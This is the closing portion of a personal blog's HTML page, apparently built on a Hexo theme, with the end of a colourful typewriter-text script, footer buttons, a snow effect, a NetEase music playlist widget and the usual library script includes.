      g = 1,
      s = 5,
      d = 75,
      b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
      c = {
        text: "",
        prefixP: -s,
        skillI: 0,
        skillP: 0,
        direction: "forward",
        delay: a,
        step: g
      };
      i()
      };
      binft(document.getElementById('binft'));
  </script>
                    </ul>
                </div>
            </div>
        </div>
        <div class="kr-tool text-center">
            <div class="tool">
                
                    <div class="box search-box">
                        <a href="/search/">
                            <span class="fa fa-search"></span>
                        </a>
                    </div>
                
                
                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>